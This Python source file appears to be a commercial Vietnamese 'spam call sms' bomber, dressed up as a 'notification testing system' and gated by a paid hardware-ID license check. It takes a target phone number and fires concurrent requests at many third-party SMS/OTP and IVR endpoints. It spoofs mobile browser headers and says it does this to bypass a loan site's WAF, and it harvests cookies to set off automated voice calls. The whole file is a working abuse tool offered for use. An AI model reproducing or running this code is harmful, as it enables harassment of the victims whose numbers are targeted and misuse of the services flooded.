import os
import sys
import json
import time
import hashlib
import platform
import subprocess
import logging
from typing import Dict, List, Any
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# ==========================================
# CẤU HÌNH HỆ THỐNG LICENSE (BẢN QUYỀN)
# ==========================================
SERVER_URL = "https://shopvietx.io.vn/api/license"
KEY_FILE_PATH = os.path.join(os.path.expanduser("~"), ".matrix_sms_key")

# ==========================================
# CẤU HÌNH LOGGING GỌN GÀNG CHO MÔI TRƯỜNG PE
# ==========================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    datefmt="[%H:%M:%S]",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("MatrixCloudEngine")

class CloudTestingEngine:
    def __init__(self):
        self.session = requests.Session()
        self.timeout = 7 
        self.init_session_policy()
        self.api_database = self.load_apis_from_memory()

    def init_session_policy(self) -> None:
        """Cấu hình kết nối Connection Pool hạn chế tối đa lỗi mạng"""
        retries = Retry(
            total=1,
            backoff_factor=0.1,
            status_forcelist=[500, 502, 503, 504],
            raise_on_status=False
        )
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retries)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.headers.update({
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        })

    def load_apis_from_memory(self) -> Dict[str, List[Any]]:
        """Đọc thẳng dữ liệu được truyền ngầm từ bộ nhớ RAM (globals)"""
        if 'IN_MEMORY_DB' in globals():
            return globals()['IN_MEMORY_DB']
        
        logger.error("[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API trong RAM!")
        return {"sms_endpoints": [], "call_endpoints": []}

    def sync_ivr_cookies(self, phone: str) -> None:
        """Đồng bộ phiên kết nối (Cookie) cho cổng IVR VayXanh - ĐÃ SỬA THEO 6.PY"""
        init_url = "https://lk.vayxanh.com/"
        params = {
            "phone": phone, 
            "amount": "2000000", 
            "term": "7",
            "utm_source": "direct_vayxanh",
            "utm_medium": "organic",
            "utm_campaign": "direct_vayxanh",
            "utm_content": "mainpage_submit"
        }
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi-VN',
            'origin': 'https://lk.vayxanh.com',
            'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        try:
            # Gửi request kèm tham số utm và bộ headers di động giả lập
            self.session.get(init_url, params=params, headers=headers, timeout=self.timeout)
            
            # Kích hoạt cơ chế Fallback nếu Server chưa nhả cookie _cabinet_key
            cookies_dict = requests.utils.dict_from_cookiejar(self.session.cookies)
            if "_cabinet_key" not in cookies_dict:
                config_url = "https://lk.vayxanh.com/internal/client/config"
                self.session.get(config_url, headers=headers, timeout=self.timeout)
        except Exception:
            pass

    def execute_request_worker(self, api: Dict[str, Any], phone: str) -> bool:
        """Hàm gửi Request ngầm và in trạng thái sạch sẽ"""
        name = api.get("name", "Dịch vụ ẩn danh")
        url = api.get("url")
        method = api.get("method", "POST").upper()
        headers = api.get("headers", {}).copy() # Dùng .copy() để không ghi đè dữ liệu gốc
        
        # ĐÃ SỬA: Ép định dạng headers di động riêng cho luồng VayXanh để bypass WAF
        if url and "vayxanh" in url.lower():
            headers.update({
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'vi-VN',
                'origin': 'https://lk.vayxanh.com',
                'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin'
            })
        
        phone_no_zero = phone[1:] if phone.startswith("0") else phone
        phone_84 = "84" + phone_no_zero
        
        raw_template = api.get("payload_template", "")
        formatted_payload = raw_template.replace("{phone}", phone)\
                                         .replace("{phone_no_zero}", phone_no_zero)\
                                         .replace("{phone_84}", phone_84)

        try:
            if api.get("is_json"):
                request_kwargs = {"json": json.loads(formatted_payload)}
            else:
                request_kwargs = {"data": formatted_payload}

            logger.info(f"[▶ RUNNING] Đang kiểm thử cổng: {name}")

            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                timeout=self.timeout,
                **request_kwargs
            )
            
            if response.status_code == 200:
                logger.info(f"  └── [✓ SUCCESS] {name} thành công.")
                return True
            else:
                logger.info(f"  └── [✕ FAILED] {name} phản hồi không chuẩn (Mã: {response.status_code}).")
                return False

        except requests.exceptions.Timeout:
            logger.info(f"  └── [🕒 TIMEOUT] {name} quá hạn phản hồi. Bỏ qua.")
        except Exception:
            logger.info(f"  └── [✕ ERROR] Không thể kết nối tới {name}.")
        
        return False

    def trigger_sms_suite(self, phone: str) -> None:
        """Kích hoạt bắn đồng thời Suite SMS bằng đa luồng cực nhanh"""
        sms_list = self.api_database.get("sms_endpoints", [])
        if not sms_list:
            print("[-] Danh sách API trống hoặc nạp từ RAM thất bại.")
            return

        print(f"\n[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...")
        print("-" * 55)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in sms_list]
            concurrent.futures.wait(futures)
            
        print("-" * 55)
        print("[✓] Hoàn tất Suite SMS.")

    def trigger_combined_suite(self, phone: str) -> None:
        """Kịch bản tích hợp: SMS trước, Call (IVR) ở cuối quy trình"""
        self.trigger_sms_suite(phone)
        
        time.sleep(1.5)
        
        call_list = self.api_database.get("call_endpoints", [])
        if not call_list:
            return

        print(f"\n[+] Khởi chạy Suite IVR: Đang thực thi {len(call_list)} cuộc gọi thoại...")
        print("-" * 55)
        
        self.sync_ivr_cookies(phone)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in call_list]
            concurrent.futures.wait(futures)
            
        print("-" * 55)
        print("[✓] Hoàn tất toàn bộ chuỗi tích hợp.")


# ==========================================
# CÁC HÀM TRỢ GIÚP: MÃ MÁY & CHECK LICENSE
# ==========================================
def get_hardware_id() -> str:
    """Tự động lấy mã định danh phần cứng duy nhất (Mã máy) tùy thuộc vào OS"""
    current_os = platform.system().lower()
    raw_id = "UNKNOWN_DEVICE"
    
    try:
        if current_os == "windows":
            cmd = "wmic csproduct get uuid"
            output = subprocess.check_output(cmd, shell=True).decode().split()
            if len(output) >= 2:
                raw_id = output[1]
        elif current_os == "linux":
            if os.path.exists("/etc/machine-id"):
                with open("/etc/machine-id", "r") as f:
                    raw_id = f.read().strip()
            elif os.path.exists("/var/lib/dbus/machine-id"):
                with open("/var/lib/dbus/machine-id", "r") as f:
                    raw_id = f.read().strip()
    except Exception:
        pass

    return hashlib.md5(raw_id.encode('utf-8')).hexdigest().upper()


def verify_license_key(key: str, hardware_id: str) -> bool:
    """Gửi yêu cầu xác thực Key và Mã máy lên Server ShopVietX"""
    try:
        payload = {"license_key": key, "hwid": hardware_id, "tool": "spam call sms"}
        # Sử dụng phương thức POST gửi lên cổng API License của bạn
        response = requests.post(SERVER_URL, json=payload, timeout=8)
        if response.status_code == 200:
            res_data = response.json()
            if res_data.get("status") == "success" or res_data.get("active") is True:
                return True
    except Exception:
        pass
    return False


def check_authentication_flow():
    """Luồng kiểm tra bản quyền nghiêm ngặt trước khi cho phép dùng Tool"""
    hw_id = get_hardware_id()
    
    # Bước 1: Kiểm tra xem trên máy đã lưu key từ trước chưa
    if os.path.exists(KEY_FILE_PATH):
        with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
            saved_key = f.read().strip()
        if saved_key and verify_license_key(saved_key, hw_id):
            return True # Key cũ vẫn chạy tốt, cho qua luôn
            
    # Bước 2: Nếu chưa có key hoặc key cũ hết hạn, bắt đầu giao diện kích hoạt
    while True:
        os.system("cls" if platform.system().lower() == "windows" else "clear")
        print("=" * 64)
        print("         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       ")
        print("=" * 64)
        print(f"  [!] Trạng thái: Chưa kích hoạt bản quyền!")
        print(f"  • Mã máy (HWID) của bạn: {hw_id}")
        print("  • Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.")
        print("-" * 64)
        
        user_key = input("[?] Nhập Key bản quyền của bạn (Hoặc bấm '0' để thoát): ").strip()
        
        if user_key == "0":
            print("[+] Đóng chương trình.")
            sys.exit(0)
            
        if not user_key:
            continue
            
        print("[+] Đang kiểm tra mã khóa trên hệ thống Server...")
        if verify_license_key(user_key, hw_id):
            # Lưu key hợp lệ xuống máy để lần sau không cần nhập lại
            with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
                f.write(user_key)
            print("[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...")
            time.sleep(1.5)
            return True
        else:
            print("[-] Lỗi: Key không hợp lệ, đã hết hạn hoặc không dùng cho máy này!")
            input("\n[Nhấn Enter để thử lại...]")


def show_banner_introduction():
    """Hiển thị phần giới thiệu thông tin công cụ sau khi đã qua bước check key"""
    os.system("cls" if platform.system().lower() == "windows" else "clear")
    hw_id = get_hardware_id()
    
    print("=" * 64)
    print("         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          ")
    print("   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) ")
    print("=" * 64)
    print(f"  • Phiên bản: Cloud Integration v3.5 (Chạy trên RAM)")
    print(f"  • Hệ điều hành: {platform.system()} {platform.release()}")
    print(f"  • Mã máy của bạn: {hw_id}")
    print(f"  • Trạng thái bản quyền: Đã kích hoạt [✓]")
    print("=" * 64)


def render_terminal_menu():
    print("\n" + "═"*20 + " MENU ĐIỀU KHIỂN CHÍNH " + "═"*20)
    print("  [1] chỉ spam SMS (SMS Only)")
    print("  [2] Chạy toàn diện (SMS + Call)")
    print("  [0] Giải phóng bộ nhớ & Thoát chương trình")
    print("═"*64)


def run_application():
    # Thực hiện chặn kiểm tra Key mua ngay lập tức khi bật tool
    check_authentication_flow()
    
    # Nếu vượt qua vòng check key thành công mới hiện Banner và Menu
    show_banner_introduction()
    core_engine = CloudTestingEngine()
    
    while True:
        render_terminal_menu()
        cmd = input("[?] Nhập tùy chọn lệnh (0-2): ").strip()
        
        if cmd == "0":
            print("[+] Bộ nhớ đệm đã được giải phóng sạch sẽ khỏi RAM. Đóng hệ thống!")
            break
        elif cmd in ["1", "2"]:
            phone = input("[?] Nhập số điện thoại mục tiêu cần test: ").strip()
            if not phone or len(phone) < 9 or not phone.isdigit():
                print("[-] Lỗi: Số điện thoại không đúng định dạng chuỗi số!")
                continue
                
            if cmd == "1":
                core_engine.trigger_sms_suite(phone)
            elif cmd == "2":
                core_engine.trigger_combined_suite(phone)
                
            input("\n[Nhấn nút Enter để tiếp tục...]")
        else:
            print("[-] Mã lệnh không hợp lệ!")

if __name__ == "__main__":
    run_application()
